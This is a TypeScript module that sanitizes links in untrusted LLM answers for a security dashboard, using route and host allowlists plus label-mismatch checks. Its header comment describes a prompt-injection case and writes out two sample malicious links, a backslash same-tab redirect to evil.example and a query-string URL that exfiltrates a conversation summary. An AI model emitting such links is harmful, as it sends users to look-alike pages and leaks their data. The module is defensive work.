/**
 * Which links in untrusted text (Copilot / LLM answers) may become clickable, and how.
 *
 * Why this exists (audit #144 / #97): a model that follows a prompt injection carried in telemetry can emit
 * `[TOKIWA の承認画面](/\evil.example/login)` — browsers treat the backslash as a slash, so a string regex that
 * accepts "/ but not //" renders a same-tab link to another origin that looks internal. It can also emit
 * `[インシデント詳細](https://evil.example/?d=<conversation summary>)` to exfiltrate data with one click.
 *
 * Rules:
 * - Internal: the raw href must start with a single "/", contain no backslash / whitespace / control / format
 *   characters, resolve (WHATWG URL parser) to the page's own origin, and its path must be one of the known UI
 *   routes in {@link INTERNAL_LINK_PREFIXES}. The *parsed* path is what the router navigates to.
 * - External: only `https:` URLs without credentials or an explicit port, on a host in
 *   {@link EXTERNAL_LINK_ALLOWLIST}, are clickable. Others are still reported (kind "external", allowed=false)
 *   so the renderer can show them as plain text together with the real host name.
 * - Anything else (javascript:, data:, protocol-relative "//", relative "x/y", malformed) → null (plain text).
 *
 * Where to adjust: add hosts to EXTERNAL_LINK_ALLOWLIST (suffix match on registrable domains you trust),
 * or pass `externalLinks="any"` to <SafeMarkdown> for a trusted, non-LLM source.
 */

/** UI routes an answer may link to (same tab). Keep in sync with `src/pages/<name>/route.tsx` paths. */
export const INTERNAL_LINK_PREFIXES: readonly string[] = [
  "/alerts",
  "/incidents",
  "/events",
  "/sessions",
  "/hosts",
  "/assets",
  "/intel",
  "/rules",
  "/response",
  "/deception",
  "/llm",
  "/copilot",
  "/settings",
];

/**
 * External hosts rendered as clickable links (https only). A host matches when it equals an entry or is a
 * subdomain of it. Deliberately excludes general hosting sites (github.com, *.github.io, pastebins …): anyone
 * can publish a look-alike page or receive query strings there.
 */
export const EXTERNAL_LINK_ALLOWLIST: readonly string[] = [
  "nvd.nist.gov",
  "cve.org",
  "cve.mitre.org",
  "attack.mitre.org",
  "cwe.mitre.org",
  "capec.mitre.org",
  "cisa.gov",
  "jvn.jp",
  "osv.dev",
  "first.org",
];

export type LinkTarget =
  | { kind: "internal"; internal: true; href: string }
  | { kind: "external"; internal: false; href: string; host: string; allowed: boolean };

/** Origin used to resolve relative paths when there is no `location` (tests, SSR). */
const SENTINEL_ORIGIN = "https://tokiwa.invalid";

/** Backslash, any whitespace (incl. tab / NBSP), C0/C1 controls, format chars (bidi, zero-width), separators. */
const UNSAFE_IN_HREF = /[\\\s\p{Cc}\p{Cf}\p{Zl}\p{Zp}]/u;

function pageOrigin(): string {
  try {
    const o = (globalThis as { location?: { origin?: string } }).location?.origin;
    return o && o !== "null" ? o : SENTINEL_ORIGIN;
  } catch {
    return SENTINEL_ORIGIN;
  }
}

export function isAllowedInternalPath(pathname: string): boolean {
  if (pathname === "/") return true;
  return INTERNAL_LINK_PREFIXES.some((p) => pathname === p || pathname.startsWith(`${p}/`));
}

export function isAllowedExternalHost(host: string, allowlist: readonly string[] = EXTERNAL_LINK_ALLOWLIST) {
  const h = host.toLowerCase().replace(/\.$/, "");
  return allowlist.some((d) => h === d || h.endsWith(`.${d}`));
}

/** Classify a link target from untrusted text. See the module comment for the rules. */
export function safeHref(raw: string): LinkTarget | null {
  if (!raw || UNSAFE_IN_HREF.test(raw)) return null;

  if (raw.startsWith("/")) {
    if (raw.startsWith("//")) return null;
    const origin = pageOrigin();
    let u: URL;
    try {
      u = new URL(raw, origin);
    } catch {
      return null;
    }
    if (u.origin !== origin || !isAllowedInternalPath(u.pathname)) return null;
    return { kind: "internal", internal: true, href: `${u.pathname}${u.search}${u.hash}` };
  }

  if (/^https?:\/\//i.test(raw)) {
    let u: URL;
    try {
      u = new URL(raw);
    } catch {
      return null;
    }
    if (u.protocol !== "https:" && u.protocol !== "http:") return null;
    const host = u.hostname;
    if (!host) return null;
    const allowed =
      u.protocol === "https:" && !u.username && !u.password && !u.port && isAllowedExternalHost(host);
    return { kind: "external", internal: false, href: u.href, host, allowed };
  }
  return null;
}

/** Strip simple inline markup so "**https://x**" is recognised as URL-shaped. */
function plainLabel(label: string): string {
  return label.replace(/[*_`]/g, "").trim();
}

const URLISH = /^(?:https?:\/\/)?(?:[\p{L}\p{N}-]+\.)+[\p{L}]{2,}(?::\d+)?(?:[/?#]\S*)?$/iu;

/**
 * Host the label *claims* to point at ("nvd.nist.gov/…", "https://example.com"), or null when the label does
 * not look like a URL / domain. Used to warn when the visible text and the real destination disagree.
 */
export function labelHost(label: string): string | null {
  const s = plainLabel(label);
  if (!s || /\s/.test(s) || !URLISH.test(s)) return null;
  try {
    return new URL(/^https?:\/\//i.test(s) ? s : `https://${s}`).hostname.toLowerCase();
  } catch {
    return null;
  }
}

/** True when the label looks like a URL/domain that differs from where the link actually goes. */
export function labelMismatch(label: string, target: LinkTarget): boolean {
  const claimed = labelHost(label);
  if (claimed == null) return false;
  if (target.kind === "internal") return true;
  return claimed.replace(/^www\./, "") !== target.host.toLowerCase().replace(/^www\./, "");
}
